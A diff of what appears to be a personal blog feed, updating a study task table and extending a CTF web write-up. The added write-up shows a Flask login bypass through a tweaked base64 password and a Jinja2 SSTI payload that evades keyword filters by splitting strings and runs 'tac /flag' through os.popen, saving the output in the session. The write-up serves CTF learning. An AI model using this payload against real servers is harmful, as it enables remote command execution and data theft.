@@ -463,11 +463,11 @@
 </thead>
 <tbody><tr>
 <td>听一节星盟的pwn课</td>
-<td></td>
+<td>Y</td>
 </tr>
 <tr>
 <td>听完pwn college的二部分所有的课</td>
-<td></td>
+<td>Y</td>
 </tr>
 <tr>
 <td>重新整了俩虚拟机</td>
@@ -478,8 +478,25 @@
 <td>Y</td>
 </tr>
 <tr>
-<td>gdb调试</td>
+<td>gdb调试学习</td>
 <td>Y</td>
+</tr>
+</tbody></table>
+<h2 id="day10-4-21"><a href="#day10-4-21" class="headerlink" title="day10 4.21"></a>day10 4.21</h2><p>貌似最近都没搞实验室的东西 要抽时间搞一下了</p>
+<table>
+<thead>
+<tr>
+<th>mission</th>
+<th>achieved</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>看一下学者给的数据集和代码</td>
+<td></td>
+</tr>
+<tr>
+<td>听一节星盟的pwn课</td>
+<td></td>
 </tr>
 </tbody></table>
 <h2 id="长期任务"><a href="#长期任务" class="headerlink" title="长期任务"></a>长期任务</h2><table>
@@ -890,10 +907,16 @@
 <p>登录这里需要绕过一下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">		<span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">			user, passwd = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line">			user = request.form[<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line">			passwd = request.form[<span class="string">&#x27;passwd&#x27;</span>]</span><br><span class="line">			<span class="keyword">if</span> user == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> bdecode(passwd) == <span class="string">&#x27;pass is admin ??&#x27;</span> <span class="keyword">and</span> <span class="built_in">len</span>(passwd) == <span class="number">24</span> <span class="keyword">and</span> passwd != <span class="string">&#x27;cGFzcyBpcyBhZG1pbiA/Pw==&#x27;</span>:</span><br><span class="line">				session[<span class="string">&#x27;user&#x27;</span>] = user</span><br><span class="line">				<span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line">			<span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=<span class="string">&#x27;Incorrect !&#x27;</span>)</span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
+<p>绕过方式</p>
+<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">cGFzcyBpcyBhZG1pbiA/Pw<span class="operator">=</span><span class="operator">=</span>  --&gt; cGFzcyBpcyBhZG1pbiA/Px<span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure>
 
-
-
-
+<p>可能是最后一位不重要吧</p>
+<p>ssti 的绕过很简单</p>
+<p><code>[&quot;__ba&quot; &quot;se__&quot;]</code> 就可以绕过</p>
+<p>但是他这里很明显不想让你去 curl</p>
+<p>所以我们尝试把flag写到某个地方 比如session中</p>
+<p>payload</p>
+<p><code>&#123;%if session.update(&#123;'f':cycler['__in' 'it__']['__glo' 'bals__']['os']['popen']('tac /flag')['re' 'ad']()&#125;&#123;%endif%&#125;</code></p>
 ]]></content>
   </entry>
   <entry>
